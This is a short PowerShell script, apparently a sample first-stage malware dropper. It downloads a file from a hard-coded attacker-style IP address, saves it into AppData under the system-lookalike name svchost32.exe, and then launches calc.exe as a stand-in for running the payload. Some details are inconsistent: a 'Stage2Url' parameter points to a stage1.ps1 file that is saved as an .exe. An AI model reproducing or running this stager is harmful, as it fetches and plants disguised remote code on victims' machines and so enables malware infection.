
[CmdletBinding()]
param(
    [string]$Stage2Url = 'https://198.51.100.177:443/stage1.ps1',
    [string]$OutputPath = "$env:APPDATA\svchost32.exe",
    [int]$TimeoutSec = 154
)
$ErrorActionPreference = "Stop"

function Get-Stage1Payload {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Beginning first stage"
    $TransferResult = Get-Stage1Payload -SourceUrl $Stage2Url -DestinationPath $OutputPath -TimeoutSec $TimeoutSec
    if ($TransferResult) {
        Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
    }
}
catch {
    Write-Warning "Stage 1 retrieval failed: $($_.Exception.Message)"
}
$StageMarker = "stage-19"
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
